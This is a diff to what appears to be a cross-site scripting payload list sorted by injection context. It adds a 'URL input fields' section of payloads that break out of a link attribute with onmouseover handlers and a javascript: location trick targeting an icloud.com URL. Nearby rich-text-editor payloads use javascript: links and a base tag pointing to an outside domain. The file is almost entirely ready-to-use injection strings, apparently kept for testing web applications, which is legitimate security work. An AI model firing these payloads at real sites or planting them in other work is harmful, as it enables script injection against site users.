@@ -28,6 +28,15 @@ n'onmouseover='prompt(-12)
 
 =============================== Frequently used Payloads end ===============================
 
+===============================    URL INPUT FIELDS START    ===============================
+
+https://google.com"onmouseover="prompt(1)
+https://google.com"onmouseover='prompt(2)
+https://www.icloud.com/mail/#<script></script>https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//
+
+
+===============================     URL INPUT FIELDS END     ===============================
+
 =============================== For Rich Text editors start  ===============================
 
 <div><a href="javascript:prompt()">CLICK ME</a> <b>2</b> <base href=//knoxss.me?> <b>2</b> <a href="https://google.com" onmouseover=prompt()">CLICK ME</a></div>
